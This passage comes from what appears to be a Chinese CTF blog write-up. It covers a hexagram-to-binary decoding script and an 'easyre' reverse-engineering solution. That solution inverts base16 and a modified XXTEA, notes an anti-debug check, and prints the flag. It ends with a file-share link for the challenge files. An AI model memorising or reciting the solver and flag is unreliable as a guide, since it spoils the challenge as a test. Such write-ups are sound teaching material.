<span class="token string">'100011'</span><span class="token punctuation">,</span> <span class="token string">'震'</span><span class="token punctuation">:</span> <span class="token string">'100100'</span><span class="token punctuation">,</span> <span class="token string">'噬嗑'</span><span class="token punctuation">:</span> <span class="token string">'100101'</span><span class="token punctuation">,</span> <span class="token string">'随'</span><span class="token punctuation">:</span> <span class="token string">'100110'</span><span class="token punctuation">,</span> <span class="token string">'无妄'</span><span class="token punctuation">:</span> <span class="token string">'100111'</span><span class="token punctuation">,</span> <span class="token string">'明夷'</span><span class="token punctuation">:</span> <span class="token string">'101000'</span><span class="token punctuation">,</span> <span class="token string">'贲'</span><span class="token punctuation">:</span> <span class="token string">'101001'</span><span class="token punctuation">,</span> <span class="token string">'既济'</span><span class="token punctuation">:</span> <span class="token string">'101010'</span><span class="token punctuation">,</span> <span class="token string">'家人'</span><span class="token punctuation">:</span> <span class="token string">'101011'</span><span class="token punctuation">,</span> <span class="token string">'丰'</span><span class="token punctuation">:</span> <span class="token string">'101100'</span><span class="token punctuation">,</span> <span class="token string">'离'</span><span class="token punctuation">:</span> <span class="token string">'101101'</span><span class="token punctuation">,</span> <span class="token string">'革'</span><span class="token punctuation">:</span> <span class="token string">'101110'</span><span class="token punctuation">,</span> <span class="token string">'同人'</span><span class="token punctuation">:</span> <span class="token string">'101111'</span><span class="token punctuation">,</span> <span class="token string">'临'</span><span class="token punctuation">:</span> <span class="token string">'110000'</span><span class="token punctuation">,</span> <span class="token string">'损'</span><span class="token punctuation">:</span> <span class="token string">'110001'</span><span class="token punctuation">,</span> <span class="token string">'节'</span><span class="token punctuation">:</span> <span class="token string">'110010'</span><span class="token punctuation">,</span> <span class="token string">'中孚'</span><span class="token punctuation">:</span> <span class="token string">'110011'</span><span class="token punctuation">,</span> <span class="token string">'归妹'</span><span class="token punctuation">:</span> <span class="token string">'110100'</span><span class="token punctuation">,</span> <span class="token string">'睽'</span><span class="token punctuation">:</span> <span class="token string">'110101'</span><span class="token punctuation">,</span> <span class="token string">'兑'</span><span class="token punctuation">:</span> <span class="token string">'110110'</span><span class="token punctuation">,</span> <span class="token string">'履'</span><span class="token punctuation">:</span> <span class="token string">'110111'</span><span class="token punctuation">,</span> <span class="token string">'泰'</span><span class="token punctuation">:</span> <span class="token string">'111000'</span><span class="token punctuation">,</span> <span class="token string">'大畜'</span><span class="token punctuation">:</span> <span class="token string">'111001'</span><span class="token punctuation">,</span> <span class="token string">'需'</span><span class="token punctuation">:</span> <span class="token string">'111010'</span><span class="token punctuation">,</span> <span class="token string">'小畜'</span><span class="token punctuation">:</span> <span class="token string">'111011'</span><span class="token punctuation">,</span> <span class="token string">'大壮'</span><span class="token punctuation">:</span> <span class="token string">'111100'</span><span class="token punctuation">,</span> <span class="token string">'大有'</span><span class="token punctuation">:</span> <span class="token string">'111101'</span><span class="token punctuation">,</span> <span class="token string">'夬'</span><span class="token punctuation">:</span> <span class="token string">'111110'</span><span class="token punctuation">,</span> <span class="token string">'乾'</span><span class="token punctuation">:</span> <span class="token string">'111111'</span><span class="token punctuation">&#125;</span>li<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>k<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> k <span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span>        k<span class="token operator">=</span><span class="token number">0</span>        <span class="token keyword">continue</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        li<span class="token punctuation">.</span>append<span class="token punctuation">(</span>dic<span class="token punctuation">[</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        t<span class="token operator">=</span><span class="token string">''</span>        t<span class="token operator">=</span>t<span class="token operator">+</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">+</span>s<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span>        li<span class="token punctuation">.</span>append<span class="token punctuation">(</span>dic<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">)</span>        k<span class="token operator">=</span><span class="token number">1</span>ss<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>li<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>ss<span class="token punctuation">)</span>enc<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>ss<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    enc<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">'0b'</span><span class="token operator">+</span>ss<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h3><ol><li><p>3 个加密算法和它们相应的逆推算法如下:</p><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">char BASE16_ENC_TAB[] &#x3D; &quot;0123456789ABCDEF&quot;;int reBASE16_ENC_TAB(char in)&#123;    if(in&gt;&#x3D;&#39;0&#39; &amp;&amp; in&lt;&#x3D;&#39;9&#39;)        return in-&#39;0&#39;;    return in-&#39;A&#39;+10;&#125;&#x2F;&#x2F; len &#x3D; 16void F1(char *in_s, int len, char *out_s)&#123;    for(int i&#x3D;0;i&lt;len;i++)&#123;        char v1 &#x3D; (in_s[i] &gt;&gt; 4) &amp; 0xf;        char v2 &#x3D; in_s[i] &amp; 0xf;        out_s[2 * i] &#x3D; BASE16_ENC_TAB[v1];        out_s[2 * i + 1] &#x3D; BASE16_ENC_TAB[v2];    &#125;&#125;&#x2F;&#x2F; len &#x3D; 32void reF1(char *in_s, int len, char *out_s)&#123;    for(int i&#x3D;0;i&lt;len;i+&#x3D;2)        out_s[i&#x2F;2] &#x3D; (reBASE16_ENC_TAB(in_s[i])&lt;&lt;4)+reBASE16_ENC_TAB(in_s[i+1]);&#125;int find_first_of(char in)&#123;    char v6[] &#x3D; &quot;0123456789ABCDEF&quot;;    for(int i&#x3D;0;i&lt;16;i++)&#123;        if(in &#x3D;&#x3D; v6[i])            return i;    &#125;&#125;void F2(char *in_s, unsigned int *out_n)&#123;    &#x2F;&#x2F; in_s 长度为 32, out_n 长度为 4    for(int i&#x3D;0;i&lt;32;i+&#x3D;8)&#123;        for(int j&#x3D;0;j&lt;8;j++)&#123;            int v2 &#x3D; find_first_of(in_s[i+j]);            out_n[i &#x2F; 8] |&#x3D; v2 &lt;&lt; (4 * (7 - j));        &#125;    &#125;&#125;void reF2(unsigned int *in_n, char *out_s)&#123;    char v6[] &#x3D; &quot;0123456789ABCDEF&quot;;    for(int i&#x3D;0;i&lt;4;i++)&#123;        for(int j&#x3D;0;j&lt;8;j++)&#123;            out_s[i*8+j] &#x3D; v6[(in_n[i] &gt;&gt; (4 * (7 - j))) &amp; 0xf];        &#125;    &#125;&#125;void F3(uint32_t *v, int n)&#123;    uint32_t const key[4] &#x3D; &#123;83, 67, 84, 70&#125;;    uint32_t y, z, sum;      unsigned p, rounds, e;     uint32_t DELTA &#x3D; 1061774306;    rounds &#x3D; 31 &#x2F; n + 8;    sum &#x3D; 0;    z &#x3D; v[n - 1];    do    &#123;        sum +&#x3D; DELTA;        e &#x3D; (sum &gt;&gt; 2) &amp; 3;        for ( p &#x3D; 0; n - 1 &gt; p; ++p )        &#123;            y &#x3D; v[p + 1];            z &#x3D; v[p] +&#x3D; (((y &lt;&lt; 7) ^ (z &gt;&gt; 5)) + ((y &gt;&gt; 3) ^ (16 * z))) ^ ((y ^ sum) + (z ^ key[e ^ p &amp; 3]));        &#125;        y &#x3D; v[0];        z &#x3D; v[n-1] +&#x3D; (((y &lt;&lt; 7) ^ (z &gt;&gt; 5)) + ((y &gt;&gt; 3) ^ (16 * z))) ^ ((y ^ sum) + (z ^ key[e ^ p &amp; 3]));        --rounds;    &#125;    while ( rounds );&#125;void reF3(uint32_t *v, int n)&#123;    uint32_t const key[4] &#x3D; &#123;83, 67, 84, 70&#125;;    uint32_t y, z, sum;      unsigned p, rounds, e;     uint32_t DELTA &#x3D; 1061774306;    rounds &#x3D; 31 &#x2F; n + 8;    sum &#x3D; rounds*DELTA;    y &#x3D; v[0];    do    &#123;        e &#x3D; (sum &gt;&gt; 2) &amp; 3;        for ( p &#x3D; n-1; p&gt;0; --p )        &#123;            z &#x3D; v[p-1];            y &#x3D; v[p] -&#x3D; (((y &lt;&lt; 7) ^ (z &gt;&gt; 5)) + ((y &gt;&gt; 3) ^ (16 * z))) ^ ((y ^ sum) + (z ^ key[e ^ p &amp; 3]));        &#125;        z &#x3D; v[n-1];        y &#x3D; v[0] -&#x3D; (((y &lt;&lt; 7) ^ (z &gt;&gt; 5)) + ((y &gt;&gt; 3) ^ (16 * z))) ^ ((y ^ sum) + (z ^ key[e ^ p &amp; 3]));        sum -&#x3D; DELTA;        --rounds;    &#125;    while ( rounds );&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有一个陷阱就是 XXTEA 第一次执行之前, delta 的值被修改了:</p><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">__int64 vary(void)&#123;  struct _STARTUPINFOA StartupInfo; &#x2F;&#x2F; [rsp+20h] [rbp-70h] BYREF  GetStartupInfoA(&amp;StartupInfo);  StartupInfo.cb &#x3D; 68;  if ( StartupInfo.dwX    || StartupInfo.dwY    || StartupInfo.dwXCountChars    || StartupInfo.dwYCountChars    || StartupInfo.dwXSize    || StartupInfo.dwYSize )  &#123;    DELTA &#x3D; 1061774306;  &#125;  return 0i64;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>在最后还有一段 C++:</p><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">std::ostringstream::basic_ostringstream(v11, 16i64);std::allocator&lt;char&gt;::allocator(&amp;v13);std::string::string(v12, &amp;unk_491000, &amp;v13);std::allocator&lt;char&gt;::~allocator(&amp;v13);std::allocator&lt;char&gt;::allocator(&amp;v14);std::string::string(v7, &quot;657402099&quot;, &amp;v14);std::allocator&lt;char&gt;::~allocator(&amp;v14);std::allocator&lt;char&gt;::allocator(&amp;v15);std::string::string(&amp;v8, &quot;6574020991321455863&quot;, &amp;v15);std::allocator&lt;char&gt;::~allocator(&amp;v15);std::allocator&lt;char&gt;::allocator(&amp;v16);std::string::string(&amp;v9, &quot;65740209913214558633720287476&quot;, &amp;v16);std::allocator&lt;char&gt;::~allocator(&amp;v16);std::allocator&lt;char&gt;::allocator(&amp;v17);std::string::string(&amp;v10, &quot;657402099132145586337202874761402167217&quot;, &amp;v17);std::allocator&lt;char&gt;::~allocator(&amp;v17);v22 &#x3D; 0;for ( j &#x3D; 0; j &lt;&#x3D; 3; ++j )&#123;    a1[j] ^&#x3D; a1[(j + 1) % 4];    std::ostream::operator&lt;&lt;(v11, a1[j]);    std::ostringstream::str((std::string *)v18, v7[0], v8);    std::string::operator&#x3D;(v12, v18);    std::string::~string((std::string *)v18);    if ( (unsigned int)std::string::compare((std::string *)v12, (const std::string *)&amp;v7[2 * j]) )        break;    v22 &#x3D; 1;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>大概意思应该是这样:</p><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">ostringstream v11;string v7[4];v7[0] &#x3D; &quot;657402099&quot;;v7[1] &#x3D; &quot;6574020991321455863&quot;;v7[2] &#x3D; &quot;65740209913214558633720287476&quot;;v7[3] &#x3D; &quot;657402099132145586337202874761402167217&quot;;ostringstream v11;for (int i &#x3D; 0; i &lt;&#x3D; 3; ++i )&#123;    v[i] ^&#x3D; v[(i + 1) % 4];    v11 &lt;&lt; v[i];    string v12 &#x3D; v11.str();    if(v12.compare(v7[i]))&#123;        puts(&quot;no&quot;);    &#125;&#125;puts(&quot;yes&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>求解一下 XXTEA 出来的 4 个数</p><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">&#x2F;*    v[0] ^&#x3D; v[1];   657402099       0,1    v[1] ^&#x3D; v[2];   1321455863      1,2    v[2] ^&#x3D; v[3];   3720287476      2,3    v[3] ^&#x3D; v[0];   1402167217      3,0,1    v[3] &#x3D; v[3]^v[0];    v[2] &#x3D; v[2]^v[3];    v[1] &#x3D; v[1]^v[2];    v[0] &#x3D; v[0]^v[1];*&#x2F;uint32_t v[4] &#x3D; &#123;657402099,1321455863,3720287476,1402167217&#125;;v[3] &#x3D; v[3]^v[0];v[2] &#x3D; v[2]^v[3];v[1] &#x3D; v[1]^v[2];v[0] &#x3D; v[0]^v[1];<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>EXP</strong></p><pre class="line-numbers language-C++" data-language="C++"><code class="language-C++">#include &lt;bits&#x2F;stdc++.h&gt;using namespace std;char BASE16_ENC_TAB[] &#x3D; &quot;0123456789ABCDEF&quot;;int reBASE16_ENC_TAB(char in)&#123;    if(in&gt;&#x3D;&#39;0&#39; &amp;&amp; in&lt;&#x3D;&#39;9&#39;)        return in-&#39;0&#39;;    return in-&#39;A&#39;+10;&#125;&#x2F;&#x2F; len &#x3D; 16void F1(char *in_s, int len, char *out_s)&#123;    for(int i&#x3D;0;i&lt;len;i++)&#123;        char v1 &#x3D; (in_s[i] &gt;&gt; 4) &amp; 0xf;        char v2 &#x3D; in_s[i] &amp; 0xf;        out_s[2 * i] &#x3D; BASE16_ENC_TAB[v1];        out_s[2 * i + 1] &#x3D; BASE16_ENC_TAB[v2];    &#125;&#125;&#x2F;&#x2F; len &#x3D; 32void reF1(char *in_s, int len, char *out_s)&#123;    for(int i&#x3D;0;i&lt;len;i+&#x3D;2)        out_s[i&#x2F;2] &#x3D; (reBASE16_ENC_TAB(in_s[i])&lt;&lt;4)+reBASE16_ENC_TAB(in_s[i+1]);&#125;bool check1()&#123;    char in[50] &#x3D; &quot;0123456789abcdef&quot;;    char out1[50];    memset(out1,0,sizeof(out1));    F1(in, 16, out1);    char out2[50];    memset(out2,0,sizeof(out2));    reF1(out1, 32, out2);    printf(&quot;%s\n&quot;, out2);&#125;int find_first_of(char in)&#123;    char v6[] &#x3D; &quot;0123456789ABCDEF&quot;;    for(int i&#x3D;0;i&lt;16;i++)&#123;        if(in &#x3D;&#x3D; v6[i])            return i;    &#125;&#125;void F2(char *in_s, unsigned int *out_n)&#123;    &#x2F;&#x2F; in_s 长度为 32, out_n 长度为 4    for(int i&#x3D;0;i&lt;32;i+&#x3D;8)&#123;        for(int j&#x3D;0;j&lt;8;j++)&#123;            int v2 &#x3D; find_first_of(in_s[i+j]);            out_n[i &#x2F; 8] |&#x3D; v2 &lt;&lt; (4 * (7 - j));        &#125;    &#125;&#125;void reF2(unsigned int *in_n, char *out_s)&#123;    char v6[] &#x3D; &quot;0123456789ABCDEF&quot;;    for(int i&#x3D;0;i&lt;4;i++)&#123;        for(int j&#x3D;0;j&lt;8;j++)&#123;            out_s[i*8+j] &#x3D; v6[(in_n[i] &gt;&gt; (4 * (7 - j))) &amp; 0xf];        &#125;    &#125;&#125;bool check2()&#123;    puts(&quot;check2&quot;);    char in[50] &#x3D; &quot;CAEA1116A622787C23D1E7AFFA163F5E&quot;;    unsigned int out1[50];    memset(out1,0,sizeof(out1));    F2(in, out1);    char out2[50];    memset(out2,0,sizeof(out2));    reF2(out1, out2);    printf(&quot;%s\n&quot;, out2);&#125;void F3(uint32_t *v, int n)&#123;    uint32_t const key[4] &#x3D; &#123;83, 67, 84, 70&#125;;    uint32_t y, z, sum;      unsigned p, rounds, e;     uint32_t DELTA &#x3D; 1061774306;    rounds &#x3D; 31 &#x2F; n + 8;    sum &#x3D; 0;    z &#x3D; v[n - 1];    do    &#123;        sum +&#x3D; DELTA;        e &#x3D; (sum &gt;&gt; 2) &amp; 3;        for ( p &#x3D; 0; n - 1 &gt; p; ++p )        &#123;            y &#x3D; v[p + 1];            z &#x3D; v[p] +&#x3D; (((y &lt;&lt; 7) ^ (z &gt;&gt; 5)) + ((y &gt;&gt; 3) ^ (16 * z))) ^ ((y ^ sum) + (z ^ key[e ^ p &amp; 3]));        &#125;        y &#x3D; v[0];        z &#x3D; v[n-1] +&#x3D; (((y &lt;&lt; 7) ^ (z &gt;&gt; 5)) + ((y &gt;&gt; 3) ^ (16 * z))) ^ ((y ^ sum) + (z ^ key[e ^ p &amp; 3]));        --rounds;    &#125;    while ( rounds );&#125;void reF3(uint32_t *v, int n)&#123;    uint32_t const key[4] &#x3D; &#123;83, 67, 84, 70&#125;;    uint32_t y, z, sum;      unsigned p, rounds, e;     uint32_t DELTA &#x3D; 1061774306;    rounds &#x3D; 31 &#x2F; n + 8;    sum &#x3D; rounds*DELTA;    y &#x3D; v[0];    do    &#123;        e &#x3D; (sum &gt;&gt; 2) &amp; 3;        for ( p &#x3D; n-1; p&gt;0; --p )        &#123;            z &#x3D; v[p-1];            y &#x3D; v[p] -&#x3D; (((y &lt;&lt; 7) ^ (z &gt;&gt; 5)) + ((y &gt;&gt; 3) ^ (16 * z))) ^ ((y ^ sum) + (z ^ key[e ^ p &amp; 3]));        &#125;        z &#x3D; v[n-1];        y &#x3D; v[0] -&#x3D; (((y &lt;&lt; 7) ^ (z &gt;&gt; 5)) + ((y &gt;&gt; 3) ^ (16 * z))) ^ ((y ^ sum) + (z ^ key[e ^ p &amp; 3]));        sum -&#x3D; DELTA;        --rounds;    &#125;    while ( rounds );&#125;void check3()&#123;    puts(&quot;check3&quot;);    uint32_t v[4] &#x3D; &#123;123,34,56,123&#125;;    F3(v, 4);    reF3(v,4);    for(int i&#x3D;0;i&lt;4;i++)        printf(&quot;%d\n&quot;, v[i]);&#125;int main()&#123;    char out1[50];    char out2[50];    memset(out1,0,sizeof(out1));    memset(out2,0,sizeof(out2));    &#x2F;*        v[0] ^&#x3D; v[1];   657402099       0,1        v[1] ^&#x3D; v[2];   1321455863      1,2        v[2] ^&#x3D; v[3];   3720287476      2,3        v[3] ^&#x3D; v[0];   1402167217      3,0,1        v[3] &#x3D; v[3]^v[0];        v[2] &#x3D; v[2]^v[3];        v[1] &#x3D; v[1]^v[2];        v[0] &#x3D; v[0]^v[1];    *&#x2F;    uint32_t v[4] &#x3D; &#123;657402099,1321455863,3720287476,1402167217&#125;;    v[3] &#x3D; v[3]^v[0];    v[2] &#x3D; v[2]^v[3];    v[1] &#x3D; v[1]^v[2];    v[0] &#x3D; v[0]^v[1];    for(int i&#x3D;0;i&lt;4;i++)&#123;        printf(&quot;%u\n&quot;, v[i]);    &#125;    reF3(v, 4);    reF2(v, out1);    reF1(out1, 32, out2);    &#x2F;&#x2F; Y0u_@r3_S0_G0od!    printf(&quot;%s\n&quot;, out2);    return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><pre class="line-numbers language-none"><code class="language-none">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1REyjdM7WjojMW3sSwdzLAw 提取码：pyzq<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
